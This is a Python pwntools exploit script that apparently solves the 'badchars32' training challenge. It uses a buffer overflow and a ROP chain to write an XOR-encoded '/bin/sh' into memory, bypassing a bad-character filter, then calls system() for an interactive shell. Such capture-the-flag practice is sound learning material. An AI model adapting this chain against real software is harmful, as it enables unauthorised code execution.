import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

badchars = ["b","i","c","f","n","s","/"," "]

def find_valid_string_with_XOR(originalString):

    FOUND_SOLUTION = False

    xor_value = 0

    while not FOUND_SOLUTION:
        xor_value += 1
        newString = ""
        for o in originalString:
            newChar = chr(ord(o) ^ xor_value)
            
            if newChar in badchars:
                break

            newString += newChar

        else:
            FOUND_SOLUTION = True
        

    return newString, xor_value

def write_string_to_memory(start_addr, string_data, g_pop, g_mov):

    # Pads the string
    required = abs((len(string_data) % 4) - 4)
    string_data += " " * required

    # Split the string into sets of 4
    chunks = re.findall(r"....", string_data)

    # Writes data to memory
    payload = b""
    for c in chunks:
        payload += g_pop
        payload += str.encode(c)
        payload += p32(start_addr)
        payload += g_mov

        # Increment the address each time
        start_addr += 4

    return payload

BINARY_NAME = "badchars32"
BUFFER_LEN = 44

command = "/bin/sh\0"

junk = b"\x90" * BUFFER_LEN

# Gadgets
g_pop      = p32(0x08048899) # pop esi; pop edi; ret; 
g_mov      = p32(0x08048893) # mov dword ptr [edi], esi; ret;
xor_gad    = p32(0x08048890) # xor byte ptr [ebx], cl ; ret)
pop_bx_cx  = p32(0x08048896) # pop ebx ; pop ecx ; ret

# Addresses
system_adr = p32(0x080484e0)
# data_addr  = 0x0804a038

data_addr = 0x804a088

xor_string, xor_value = find_valid_string_with_XOR(command)

# Writes XOR string to memory
payload  = b""
payload += junk
payload += write_string_to_memory(data_addr, xor_string, g_pop, g_mov)

# XORs string with value
xor_addr = data_addr
for o in command:
    payload += pop_bx_cx
    payload += p32(xor_addr)
    payload += p32(xor_value)
    payload += xor_gad

    xor_addr += 1

payload += system_adr
payload += p32(0x90)
payload += p32(data_addr)

io = process(f"./{BINARY_NAME}")
io.recvuntil("\n> ")
io.send(payload)
io.send("\n")
io.interactive()

# sys.stdout.buffer.write(payload)